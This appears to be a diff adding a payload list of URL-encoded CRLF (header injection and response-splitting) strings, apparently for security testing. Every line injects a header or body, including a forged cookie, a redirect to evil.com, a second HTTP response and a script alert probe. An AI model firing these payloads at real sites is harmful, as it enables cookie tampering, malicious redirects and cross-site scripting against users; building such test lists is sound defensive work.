@@ -1,0 +1,10 @@
+%0d%0aSet-Cookie:evil=1
+%0d%0aContent-Length:0
+%0d%0aLocation:https://evil.com
+%0d%0aContent-Type:text/html
+%0d%0aX-Test:injected
+%0d%0a%0d%0a<h1>Injected</h1>
+%0d%0a%0d%0aHTTP/1.1 200 OK
+%0d%0a%0d%0a<script>alert(1)</script>
+%0d%0aConnection:close
+%0d%0aCache-Control:no-cache
